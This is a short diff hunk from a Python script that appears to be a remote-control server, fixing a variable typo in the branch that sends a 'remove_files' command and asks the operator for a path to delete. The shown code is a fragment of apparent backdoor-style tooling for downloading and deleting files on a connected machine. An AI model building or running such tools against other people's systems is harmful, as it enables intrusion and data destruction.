@@ -60,7 +60,7 @@ while 1:
         print("File downloaded successfully!")
     
     elif command == "remove_files":
-        comm.send(command.encode())
+        conn.send(command.encode())
         print("Command r has been executed successfully!")
 
         filepath = input(str("Please input the file path you want to delete: "))
